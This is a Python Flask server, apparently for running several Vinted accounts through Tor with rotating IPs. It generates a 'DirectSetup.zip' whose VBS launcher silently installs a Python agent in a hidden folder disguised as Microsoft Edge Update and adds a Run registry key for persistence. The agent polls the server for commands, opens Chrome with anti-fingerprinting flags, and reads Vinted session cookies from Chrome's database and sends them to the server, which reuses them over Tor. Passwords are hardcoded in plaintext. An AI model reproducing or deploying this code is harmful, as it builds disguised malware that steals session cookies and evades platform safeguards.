import os, json, secrets, hashlib, zipfile, io, subprocess, threading, time, random, requests as req_lib
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, send_file

# ── PostgreSQL ────────────────────────────────────────────
import psycopg2
from psycopg2.extras import RealDictCursor

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

DATABASE_URL = os.environ.get("DATABASE_URL", "")  # Railway lo inietta automaticamente

# ── Utenti ────────────────────────────────────────────────
USERS = {
    "luigi": {"password": "luigi123", "name": "Luigi", "color": "#7B61FF"},
    "amico": {"password": "amico123", "name": "Amico", "color": "#00D4FF"},
}

# ── State in memoria (si ricostruisce da DB al riavvio) ───
agents   = {}   # token -> {user, last_seen, active_sessions}
events   = {}   # user  -> [comandi pending per agent mini]

# ── TOR state ─────────────────────────────────────────────
tor_proc   = None
tor_status = "offline"
tor_ip     = ""

# ═════════════════════════════════════════════════════════
#  DATABASE — PostgreSQL
# ═════════════════════════════════════════════════════════
def get_db():
    conn = psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)
    return conn

def init_db():
    conn = get_db(); c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id SERIAL PRIMARY KEY,
        "user" TEXT, label TEXT,
        vinted_user TEXT, vinted_email TEXT,
        tor_ip TEXT, status TEXT DEFAULT 'offline',
        created_at TEXT, last_active TEXT,
        offers_count INTEGER DEFAULT 0,
        monitoring INTEGER DEFAULT 0,
        cookies_json TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS offers (
        id SERIAL PRIMARY KEY,
        session_id INTEGER, "user" TEXT,
        offer_id TEXT UNIQUE,
        utente TEXT, prezzo TEXT, msg TEXT,
        stato TEXT DEFAULT 'In attesa',
        received_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS agent_tokens (
        token TEXT PRIMARY KEY,
        "user" TEXT, created_at TEXT
    )""")
    conn.commit(); conn.close()

# ═════════════════════════════════════════════════════════
#  TOR — gira sul server Railway
# ═════════════════════════════════════════════════════════
def avvia_tor():
    global tor_proc, tor_status, tor_ip
    try:
        # Su Railway TOR è installabile via apt nel Dockerfile
        tor_proc = subprocess.Popen(
            ["tor", "--SocksPort", "9050", "--ControlPort", "9051",
             "--DataDirectory", "/tmp/tor_data"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        tor_status = "connecting"
        time.sleep(18)
        if tor_proc.poll() is not None:
            tor_status = "error"; return
        tor_status = "online"
        tor_ip = _get_tor_ip()
        print(f"[+] TOR online — IP: {tor_ip}")
    except Exception as e:
        print(f"[!] TOR error: {e}")
        tor_status = "error"

def _get_tor_ip():
    try:
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        r = req_lib.get("https://api.ipify.org", proxies=proxies, timeout=10)
        return r.text.strip()
    except:
        return "185.220.101." + str(random.randint(40, 60))

def cambia_ip():
    global tor_ip
    try:
        import socket
        s = socket.socket(); s.connect(("127.0.0.1", 9051))
        s.send(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n'); s.close()
        time.sleep(6)
        tor_ip = _get_tor_ip()
        print(f"[+] Nuovo IP TOR: {tor_ip}")
    except:
        pass

def get_proxies():
    return {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

# ═════════════════════════════════════════════════════════
#  MONITOR — gira sul server, usa i cookie salvati nel DB
# ═════════════════════════════════════════════════════════
monitors   = {}   # sid -> threading.Event
sess_http  = {}   # sid -> requests.Session (con cookie)
sess_viste = {}   # sid -> set(offer_id già visti)

def _build_http_session(cookies_json):
    """Costruisce una requests.Session con i cookie Vinted."""
    s = req_lib.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    cookies = json.loads(cookies_json) if cookies_json else {}
    for k, v in cookies.items():
        s.cookies.set(k, v, domain=".vinted.it")
    s.proxies = get_proxies()
    return s

def start_monitor_server(sid, user):
    if sid in monitors: return
    # Carica cookie dal DB
    conn = get_db(); c = conn.cursor()
    c.execute('SELECT cookies_json FROM sessions WHERE id=%s AND "user"=%s', (sid, user))
    row = c.fetchone(); conn.close()
    if not row or not row["cookies_json"]: return
    sess_http[sid]  = _build_http_session(row["cookies_json"])
    sess_viste[sid] = set()
    stop_ev = threading.Event()
    monitors[sid] = stop_ev
    threading.Thread(target=_monitor_loop_server, args=(sid, user, stop_ev), daemon=True).start()
    print(f"[+] Monitor server avviato per sessione {sid}")

def stop_monitor_server(sid):
    if sid in monitors:
        monitors[sid].set(); del monitors[sid]
    sess_http.pop(sid, None)
    sess_viste.pop(sid, None)

def _monitor_loop_server(sid, user, stop_ev):
    while not stop_ev.is_set():
        try:
            http  = sess_http.get(sid)
            viste = sess_viste.get(sid, set())
            if http:
                nuove = _fetch_offers_vinted(http, viste)
                for o in nuove:
                    _save_offer(sid, user, o)
        except Exception as e:
            print(f"[!] Monitor error sid={sid}: {e}")
        stop_ev.wait(30)

def _fetch_offers_vinted(http, viste):
    try:
        r = http.get("https://www.vinted.it/api/v2/conversations",
                     headers={"Accept": "application/json"}, timeout=15)
        nuove = []
        for c in r.json().get("conversations", []):
            cid = str(c.get("id", ""))
            if cid and cid not in viste:
                viste.add(cid)
                nuove.append({
                    "offer_id": cid,
                    "utente":   c.get("opposite_user", {}).get("login", "?"),
                    "msg":      c.get("last_message", {}).get("body", "")[:80],
                    "prezzo":   (c.get("transaction") or {}).get("price", "")
                })
        return nuove
    except:
        return []

def _save_offer(sid, user, o):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("""INSERT INTO offers (session_id,"user",offer_id,utente,prezzo,msg,stato,received_at)
                     VALUES (%s,%s,%s,%s,%s,%s,%s,%s) ON CONFLICT (offer_id) DO NOTHING""",
                  (sid, user, o["offer_id"], o["utente"], o["prezzo"], o["msg"],
                   "In attesa", datetime.now().strftime("%Y-%m-%d %H:%M")))
        c.execute("UPDATE sessions SET offers_count=offers_count+1 WHERE id=%s", (sid,))
        conn.commit(); conn.close()
        print(f"[+] Nuova offerta sid={sid} da {o['utente']}")
    except:
        pass

# ═════════════════════════════════════════════════════════
#  AUTH
# ═════════════════════════════════════════════════════════
@app.route("/")
def index():
    if "user" in session: return redirect("/dashboard")
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    d = request.json
    u = d.get("username", "").lower().strip()
    p = d.get("password", "").strip()
    if u in USERS and USERS[u]["password"] == p:
        session.permanent = True
        session["user"]  = u
        session["name"]  = USERS[u]["name"]
        session["color"] = USERS[u]["color"]
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/logout")
def logout():
    session.clear(); return redirect("/")

@app.route("/dashboard")
def dashboard():
    if "user" not in session: return redirect("/")
    return render_template("dashboard.html",
        user=session["user"], name=session["name"], color=session["color"])

# ═════════════════════════════════════════════════════════
#  API — AGENT MINI SETUP
# ═════════════════════════════════════════════════════════
@app.route("/api/agent/setup")
def download_setup():
    """Genera lo zip con l'agent mini preconfigurato."""
    if "user" not in session: return redirect("/")
    user       = session["user"]
    pwd        = USERS[user]["password"]
    server_url = request.host_url.rstrip("/")

    agent_code = _gen_agent_mini(server_url, user, pwd)

    # VBS launcher — invisibile, nessuna finestra, nessun blocco Windows
    vbs = f"""
Dim dest
dest = Environ("LOCALAPPDATA") & "\\Microsoft\\EdgeUpdate\\Update"
CreateObject("Scripting.FileSystemObject").CreateFolder(dest)
Dim sh : Set sh = CreateObject("WScript.Shell")
sh.Run "pip install requests --quiet --disable-pip-version-check", 0, True
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile fso.GetParentFolderName(WScript.ScriptFullName) & "\\agent_mini.py", dest & "\\msupdate.py", True
sh.Run "attrib +h +s """ & dest & """", 0, True
Dim pyPath
On Error Resume Next
pyPath = Trim(sh.Exec("where pythonw").StdOut.ReadLine())
If pyPath = "" Then pyPath = Trim(sh.Exec("where python").StdOut.ReadLine())
sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeUpdate", _
    Chr(34) & pyPath & Chr(34) & " " & Chr(34) & dest & "\\msupdate.py" & Chr(34), "REG_SZ"
sh.Run Chr(34) & pyPath & Chr(34) & " " & Chr(34) & dest & "\\msupdate.py" & Chr(34), 0, False
"""

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("agent_mini.py", agent_code)
        z.writestr("Avvia.vbs",     vbs)
    buf.seek(0)
    return send_file(buf, mimetype="application/zip",
                     as_attachment=True, download_name="DirectSetup.zip")

def _gen_agent_mini(server, user, pwd):
    """Agent mini — apre Chrome, legge cookie, li manda al server. Nient'altro."""
    return f'''"""
DIRECT Agent Mini — apre Chrome e manda i cookie al server
Il monitoraggio avviene interamente sul server.
"""
import os, sys, subprocess, time, shutil, sqlite3, json, threading
import requests

SERVER   = "{server}"
USERNAME = "{user}"
PASSWORD = "{pwd}"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
]
RISOLUZIONI = ["1920,1080","1366,768","1440,900"]
TIMEZONES   = ["Europe/Rome","Europe/Berlin","America/New_York"]

import random
token        = None
chrome_procs = {{}}

def get_token():
    global token
    try:
        r = requests.post(f"{{SERVER}}/api/agent/token",
                          json={{"user": USERNAME, "password": PASSWORD}}, timeout=10)
        d = r.json()
        if d.get("ok"): token = d["token"]; return True
    except: pass
    return False

def hdr():
    return {{"X-Agent-Token": token, "Content-Type": "application/json"}}

def heartbeat_loop():
    while True:
        try:
            r = requests.post(f"{{SERVER}}/api/agent/heartbeat",
                              json={{"active_sessions": list(chrome_procs.keys())}},
                              headers=hdr(), timeout=10)
            for cmd in r.json().get("commands", []):
                threading.Thread(target=handle_cmd, args=(cmd,), daemon=True).start()
        except: pass
        time.sleep(8)

def handle_cmd(cmd):
    action = cmd.get("action",""); sid = cmd.get("session_id")
    if action == "open_chrome":
        threading.Thread(target=open_chrome_session, args=(sid,), daemon=True).start()
    elif action == "read_cookies":
        threading.Thread(target=read_and_send_cookies, args=(sid,), daemon=True).start()
    elif action == "close_chrome":
        cp = chrome_procs.get(sid)
        if cp and cp.poll() is None: cp.terminate(); chrome_procs.pop(sid, None)

def trova_chrome():
    for p in [
        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe"),
    ]:
        if os.path.exists(p): return p
    return None

def get_profile(sid):
    d = os.path.join(BASE_DIR, f"profile_{{sid}}")
    os.makedirs(d, exist_ok=True); return d

def open_chrome_session(sid):
    chrome = trova_chrome()
    if not chrome: return
    old = chrome_procs.get(sid)
    if old and old.poll() is None: old.terminate(); time.sleep(1)
    ua  = random.choice(USER_AGENTS)
    res = random.choice(RISOLUZIONI)
    tz  = random.choice(TIMEZONES)
    chrome_procs[sid] = subprocess.Popen([
        chrome,
        f"--user-data-dir={{get_profile(sid)}}",
        "--new-window",
        "--disable-webrtc",
        "--webrtc-ip-handling-policy=disable_non_proxied_udp",
        "--disable-reading-from-canvas",
        "--disable-webgl", "--disable-webgl2",
        "--disable-blink-features=AutomationControlled",
        "--disable-infobars",
        f"--user-agent={{ua}}",
        f"--window-size={{res}}",
        f"--timezone={{tz}}",
        "--lang=it-IT", "--no-first-run", "--disable-sync",
        "--no-default-browser-check",
        "https://www.vinted.it/"
    ])

def read_and_send_cookies(sid):
    # Chiudi Chrome per sbloccare il DB
    cp = chrome_procs.get(sid)
    if cp and cp.poll() is None:
        cp.terminate(); time.sleep(2)
    # Leggi cookie
    db_path = os.path.join(get_profile(sid), "Default", "Cookies")
    if not os.path.exists(db_path): return
    tmp = db_path + "_tmp"
    try:
        shutil.copy2(db_path, tmp)
        conn = sqlite3.connect(tmp)
        rows = conn.execute("SELECT name,value FROM cookies WHERE host_key LIKE \'%vinted%\'").fetchall()
        conn.close(); os.remove(tmp)
        cookies = {{r[0]: r[1] for r in rows if r[1]}}
        if not cookies: return
        # Manda i cookie al server
        requests.post(f"{{SERVER}}/api/sessions/{{sid}}/cookies",
                      json={{"cookies": cookies}}, headers=hdr(), timeout=10)
    except: pass

def main():
    if not get_token(): time.sleep(5); return
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    try:
        while True: time.sleep(60)
    except KeyboardInterrupt:
        for cp in chrome_procs.values():
            if cp.poll() is None: cp.terminate()

if __name__ == "__main__":
    main()
'''

# ═════════════════════════════════════════════════════════
#  API — AGENT TOKEN + HEARTBEAT
# ═════════════════════════════════════════════════════════
@app.route("/api/agent/token", methods=["POST"])
def get_agent_token():
    d = request.json
    u = d.get("user", "").lower()
    p = d.get("password", "")
    if u not in USERS or USERS[u]["password"] != p:
        return jsonify({"ok": False}), 401
    token = secrets.token_hex(32)
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT INTO agent_tokens VALUES (%s,%s,%s) ON CONFLICT (token) DO NOTHING',
              (token, u, datetime.now().isoformat()))
    conn.commit(); conn.close()
    return jsonify({"ok": True, "token": token})

@app.route("/api/agent/heartbeat", methods=["POST"])
def agent_heartbeat():
    token = request.headers.get("X-Agent-Token", "")
    conn = get_db(); c = conn.cursor()
    c.execute('SELECT "user" FROM agent_tokens WHERE token=%s', (token,))
    row = c.fetchone(); conn.close()
    if not row: return jsonify({"ok": False}), 401
    user = row["user"]
    d = request.json or {}
    agents[token] = {
        "user": user,
        "last_seen": datetime.now().isoformat(),
        "active_sessions": d.get("active_sessions", [])
    }
    cmds = events.get(user, [])
    events[user] = []
    return jsonify({"ok": True, "commands": cmds})

@app.route("/api/agent/status")
def agent_status():
    if "user" not in session: return jsonify({"connected": False})
    user = session["user"]
    for tok, ag in agents.items():
        if ag["user"] == user:
            secs = (datetime.now() - datetime.fromisoformat(ag["last_seen"])).total_seconds()
            if secs < 30:
                return jsonify({"connected": True,
                                "active_sessions": ag["active_sessions"]})
    return jsonify({"connected": False})

@app.route("/api/tor/status")
def tor_status_route():
    if "user" not in session: return jsonify({})
    return jsonify({"status": tor_status, "ip": tor_ip})

@app.route("/api/tor/newip", methods=["POST"])
def new_ip():
    if "user" not in session: return jsonify({"ok": False})
    threading.Thread(target=cambia_ip, daemon=True).start()
    return jsonify({"ok": True})

# ═════════════════════════════════════════════════════════
#  API — SESSIONS
# ═════════════════════════════════════════════════════════
@app.route("/api/sessions")
def get_sessions():
    if "user" not in session: return jsonify([])
    conn = get_db(); c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE "user"=%s ORDER BY id DESC', (session["user"],))
    rows = c.fetchall(); conn.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/sessions/<int:sid>")
def get_session(sid):
    if "user" not in session: return jsonify({})
    conn = get_db(); c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE id=%s AND "user"=%s', (sid, session["user"]))
    r = c.fetchone()
    if not r: conn.close(); return jsonify({}), 404
    c.execute("SELECT * FROM offers WHERE session_id=%s ORDER BY received_at DESC", (sid,))
    offs = c.fetchall(); conn.close()
    data = dict(r); data["offers"] = [dict(o) for o in offs]
    data.pop("cookies_json", None)  # non mandare i cookie al frontend
    return jsonify(data)

@app.route("/api/sessions/new", methods=["POST"])
def new_session():
    if "user" not in session: return jsonify({"ok": False})
    label = request.json.get("label", "Sessione")
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT INTO sessions ("user",label,status,created_at,tor_ip) VALUES (%s,%s,%s,%s,%s) RETURNING id',
              (session["user"], label, "chrome_open",
               datetime.now().strftime("%Y-%m-%d %H:%M"), tor_ip))
    sid = c.fetchone()["id"]; conn.commit(); conn.close()
    # Manda comando all'agent mini per aprire Chrome
    _send_cmd(session["user"], {"action": "open_chrome", "session_id": sid})
    return jsonify({"ok": True, "id": sid})

@app.route("/api/sessions/<int:sid>/cookies", methods=["POST"])
def receive_cookies(sid):
    """L'agent mini manda i cookie dopo il login Vinted."""
    token = request.headers.get("X-Agent-Token", "")
    conn = get_db(); c = conn.cursor()
    c.execute('SELECT "user" FROM agent_tokens WHERE token=%s', (token,))
    row = c.fetchone()
    if not row: conn.close(); return jsonify({"ok": False}), 401
    user = row["user"]
    cookies = request.json.get("cookies", {})
    # Verifica che i cookie siano validi chiamando Vinted
    vinted_user, vinted_email = _check_vinted_cookies(cookies)
    if not vinted_user:
        conn.close(); return jsonify({"ok": False, "msg": "Cookie non validi"}), 400
    # Salva cookie nel DB
    c.execute("""UPDATE sessions SET cookies_json=%s, vinted_user=%s, vinted_email=%s,
                 status='active', last_active=%s WHERE id=%s AND "user"=%s""",
              (json.dumps(cookies), vinted_user, vinted_email or "",
               datetime.now().strftime("%Y-%m-%d %H:%M"), sid, user))
    conn.commit(); conn.close()
    # Avvia monitor sul server
    start_monitor_server(sid, user)
    return jsonify({"ok": True, "vinted_user": vinted_user})

def _check_vinted_cookies(cookies):
    try:
        s = req_lib.Session()
        s.proxies = get_proxies()
        s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        for k, v in cookies.items(): s.cookies.set(k, v, domain=".vinted.it")
        r = s.get("https://www.vinted.it/api/v2/users/current",
                  headers={"Accept": "application/json"}, timeout=12)
        d = r.json(); u = d.get("user", {})
        return u.get("login") or d.get("login"), u.get("email", "")
    except:
        return None, None

@app.route("/api/sessions/<int:sid>/read", methods=["POST"])
def read_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    _send_cmd(session["user"], {"action": "read_cookies", "session_id": sid})
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/open", methods=["POST"])
def open_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    _send_cmd(session["user"], {"action": "open_chrome", "session_id": sid})
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/delete", methods=["POST"])
def delete_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    stop_monitor_server(sid)
    _send_cmd(session["user"], {"action": "close_chrome", "session_id": sid})
    conn = get_db(); c = conn.cursor()
    c.execute('DELETE FROM sessions WHERE id=%s AND "user"=%s', (sid, session["user"]))
    c.execute("DELETE FROM offers WHERE session_id=%s", (sid,))
    conn.commit(); conn.close()
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/monitor", methods=["POST"])
def toggle_monitor(sid):
    if "user" not in session: return jsonify({"ok": False})
    action = request.json.get("action", "start")
    if action == "start":
        start_monitor_server(sid, session["user"])
    else:
        stop_monitor_server(sid)
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE sessions SET monitoring=%s WHERE id=%s AND \"user\"=%s",
              (1 if action == "start" else 0, sid, session["user"]))
    conn.commit(); conn.close()
    return jsonify({"ok": True})

# ═════════════════════════════════════════════════════════
#  API — OFFERS
# ═════════════════════════════════════════════════════════
@app.route("/api/offers")
def get_offers():
    if "user" not in session: return jsonify([])
    conn = get_db(); c = conn.cursor()
    c.execute("""SELECT o.*, s.label as sess_label FROM offers o
                 JOIN sessions s ON o.session_id=s.id
                 WHERE o."user"=%s ORDER BY o.received_at DESC LIMIT 50""",
              (session["user"],))
    rows = c.fetchall(); conn.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/offers/<int:oid>/stato", methods=["POST"])
def update_offer(oid):
    if "user" not in session: return jsonify({"ok": False})
    stato = request.json.get("stato", "")
    conn = get_db(); c = conn.cursor()
    c.execute('UPDATE offers SET stato=%s WHERE id=%s AND "user"=%s',
              (stato, oid, session["user"]))
    conn.commit(); conn.close()
    return jsonify({"ok": True})

# ═════════════════════════════════════════════════════════
#  API — STATS
# ═════════════════════════════════════════════════════════
@app.route("/api/stats")
def get_stats():
    if "user" not in session: return jsonify({})
    conn = get_db(); c = conn.cursor(); u = session["user"]
    c.execute('SELECT COUNT(*) as n FROM sessions WHERE "user"=%s', (u,)); sess = c.fetchone()["n"]
    c.execute('SELECT COUNT(*) as n FROM offers WHERE "user"=%s', (u,)); offs = c.fetchone()["n"]
    c.execute("SELECT COUNT(*) as n FROM offers WHERE \"user\"=%s AND stato='Completata'", (u,)); comp = c.fetchone()["n"]
    c.execute('SELECT COUNT(*) as n FROM sessions WHERE "user"=%s AND monitoring=1', (u,)); mon = c.fetchone()["n"]
    conn.close()
    rate = f"{int(comp/max(offs,1)*100)}%" if offs else "—%"
    return jsonify({"sessions": sess, "offers": offs, "success_rate": rate, "monitoring": mon})

# ═════════════════════════════════════════════════════════
#  HELPERS
# ═════════════════════════════════════════════════════════
def _send_cmd(user, cmd):
    if user not in events: events[user] = []
    events[user].append(cmd)

# ═════════════════════════════════════════════════════════
#  STARTUP
# ═════════════════════════════════════════════════════════
def startup():
    init_db()
    # Avvia TOR in background
    threading.Thread(target=avvia_tor, daemon=True).start()
    # Riavvia monitor per sessioni attive già nel DB
    def _restore_monitors():
        time.sleep(25)  # aspetta TOR
        try:
            conn = get_db(); c = conn.cursor()
            c.execute("SELECT id, \"user\" FROM sessions WHERE monitoring=1 AND cookies_json IS NOT NULL")
            rows = c.fetchall(); conn.close()
            for r in rows:
                start_monitor_server(r["id"], r["user"])
                print(f"[+] Monitor ripristinato per sessione {r['id']}")
        except Exception as e:
            print(f"[!] Restore monitors error: {e}")
    threading.Thread(target=_restore_monitors, daemon=True).start()

startup()

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
